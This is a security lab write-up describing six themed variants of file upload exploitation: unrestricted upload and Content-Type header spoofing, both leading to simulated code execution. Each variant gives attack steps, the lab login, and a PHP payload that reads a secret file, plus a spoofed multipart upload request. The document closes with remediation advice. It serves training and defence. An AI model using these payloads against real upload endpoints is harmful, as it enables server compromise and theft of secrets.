# Case Study: Lab 5 - File Upload Exploitation

## Business Context

**Company**: SecureCart Labs  
**Role**: Application Security Analyst  
**Date**: Q2 2026  
**Severity**: CRITICAL ⚠️

---

## Executive Summary

Lab 5 contains two vulnerability tracks with three themed variants each:

1. **Lab 5.1 (A-C): Unrestricted File Upload -> Simulated RCE**
2. **Lab 5.2 (A-C): Content-Type Validation Bypass -> Simulated RCE**

All variants use the same core exploit goal: upload a crafted PHP file and trigger it from `/files/avatars/<uid>/<filename>` to read Carlos's secret.

---

## Business Problem Statement

The platform allows authenticated users to upload avatar/profile files. Uploaded files are then directly retrievable from a public path. Validation is either missing (Lab 5.1) or weakly implemented by trusting only multipart `Content-Type` headers (Lab 5.2).

This creates a high-risk condition where executable payloads can be stored and invoked as if they were trusted media assets.

---

## Vulnerability Overview

### Vulnerability Class 1: Unrestricted Upload (Lab 5.1)

- No strict extension allowlist on uploaded filenames.
- No file content inspection for executable code.
- Uploaded `.php` files are reachable via a predictable public route.
- The file-serving logic simulates execution when a PHP payload includes `file_get_contents('/home/carlos/secret')`.

### Vulnerability Class 2: MIME/Content-Type Bypass (Lab 5.2)

- Upload handler checks only declared multipart `Content-Type` (`image/jpeg` or `image/png`).
- Server does not verify actual file bytes/magic signature.
- Attackers can upload `exploit.php` while spoofing `Content-Type: image/jpeg`.
- File is still saved with `.php` extension and then invoked from avatar path.

---

## Common Pre-Condition

Use lab credentials:

- **Username**: `wiener`
- **Password**: `peter`

Target payload used across variants:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

## Challenge Group: Lab 5.1 - Unrestricted Upload

### VARIANT 5.1 A: Retail Avatar Workflow

#### Problem Statement
Retail account avatar upload accepts user files and serves them back from `/files/avatars/...`. The task is to weaponize the same upload path to execute a PHP payload.

#### Vulnerability Description
The upload endpoint does not enforce safe extension/content checks. Any filename (including `exploit.php`) is stored and exposed through the avatar file route.

#### Attack Steps
1. Open `/lab5/1/login` and authenticate as `wiener:peter`.
2. Go to `/lab5/1/account` and upload a normal image first.
3. Capture the resulting avatar fetch path from browser/Burp (`GET /files/avatars/<uid>/<file>`).
4. Upload `exploit.php` containing the secret-read payload.
5. Request the uploaded PHP path directly via browser or Repeater.
6. Capture flag output/secret in the response.

#### Payload
**File name**:
```text
exploit.php
```

**File content**:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Execution request**:
```http
GET /files/avatars/<uid>/exploit.php
```

---

### VARIANT 5.1 B: PixelArt Gallery

#### Problem Statement
NFT/gallery profile artwork upload follows the same avatar storage and retrieval chain. The challenge is identical but themed differently.

#### Vulnerability Description
No robust file validation is performed before saving uploads. A PHP file can be uploaded and retrieved through the public avatar route.

#### Attack Steps
1. Login at `/lab5/1/b/login` with `wiener:peter`.
2. Upload a benign artwork file from `/lab5/1/b/account`.
3. Observe and note the generated avatar URL under `/files/avatars/<uid>/...`.
4. Replace upload with `exploit.php` carrying the malicious payload.
5. Call `/files/avatars/<uid>/exploit.php` directly.
6. Read the returned flag/secret.

#### Payload
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```http
GET /files/avatars/<uid>/exploit.php
```

---

### VARIANT 5.1 C: HireMinds Badge Upload

#### Problem Statement
Recruiter badge upload in the hiring portal allows unsafe file handling. The objective is to pivot from badge upload to payload execution.

#### Vulnerability Description
Upload controls remain permissive and executable files are not blocked. Served avatar path can be used to trigger uploaded PHP.

#### Attack Steps
1. Login at `/lab5/1/c/login` with `wiener:peter`.
2. Upload a normal badge/avatar to establish the expected flow.
3. Capture avatar request path `/files/avatars/<uid>/<filename>`.
4. Upload `exploit.php` with secret-read code.
5. Trigger it via direct `GET` on uploaded path.
6. Record the flag in response.

#### Payload
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```http
GET /files/avatars/<uid>/exploit.php
```

---

## Challenge Group: Lab 5.2 - Content-Type Bypass

### VARIANT 5.2 A: Retail Media Gate

#### Problem Statement
The application attempts to restrict uploads to JPEG/PNG by checking multipart metadata. The task is to bypass this check and still upload executable payload.

#### Vulnerability Description
Validation trusts the declared `Content-Type` header instead of real file content. A `.php` file is accepted when sent with `Content-Type: image/jpeg`.

#### Attack Steps
1. Login at `/lab5/2/login` with `wiener:peter`.
2. Attempt direct `exploit.php` upload and observe rejection (default PHP MIME type blocked).
3. Send upload request to Burp Repeater.
4. Modify multipart file part header to `Content-Type: image/jpeg` (or `image/png`).
5. Keep filename as `exploit.php` and replay request.
6. Access `/files/avatars/<uid>/exploit.php` to execute payload and retrieve flag.

#### Payload
**Multipart bypass pattern**:
```http
POST /lab5/2/upload
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------BOUNDARY--
```

**Execution request**:
```http
GET /files/avatars/<uid>/exploit.php
```

---

### VARIANT 5.2 B: Global Logistics Driver Portal

#### Problem Statement
Driver signature upload appears stricter than 5.1 but still depends on mutable request metadata.

#### Vulnerability Description
The backend validates only `file.content_type` and allows upload if header says JPEG/PNG, regardless of dangerous extension/content.

#### Attack Steps
1. Login at `/lab5/2/b/login`.
2. Intercept upload from `/lab5/2/b/account`.
3. Use `filename="exploit.php"` in multipart part.
4. Force file part `Content-Type: image/jpeg`.
5. Replay upload and confirm acceptance.
6. Call `/files/avatars/<uid>/exploit.php` and extract flag.

#### Payload
```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### VARIANT 5.2 C: SecureBank Verification Upload

#### Problem Statement
Document verification upload in banking theme enforces policy text in UI but applies weak technical validation server-side.

#### Vulnerability Description
Multipart MIME checks are bypassable; file content and extension safety are not enforced. Uploaded PHP can still be invoked through public avatar route.

#### Attack Steps
1. Login at `/lab5/2/c/login`.
2. Upload attempt with raw PHP fails unless metadata is manipulated.
3. Intercept the request and set file part header to `Content-Type: image/png` or `image/jpeg`.
4. Keep `filename="exploit.php"` and include PHP payload body.
5. Replay request and verify upload success message.
6. Open `/files/avatars/<uid>/exploit.php` and collect flag.

#### Payload
```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

## Impact Summary

If this pattern existed in a real production system, impact could include:

- Remote code execution from upload surface
- Secret and config disclosure
- Data exfiltration and account takeover pivoting
- Full server compromise depending on runtime permissions

---

## Recommended Fixes

1. Enforce strict server-side extension allowlists (`.jpg`, `.jpeg`, `.png`) and reject executable types.
2. Validate real file signatures (magic bytes), not only multipart `Content-Type` headers.
3. Store uploads outside web-executable paths and serve via opaque object IDs.
4. Rename uploaded files to random safe names, dropping user-supplied extensions.
5. Apply antivirus/content scanning and block script markers.
6. Disable execution in upload directories at web server/runtime layer.
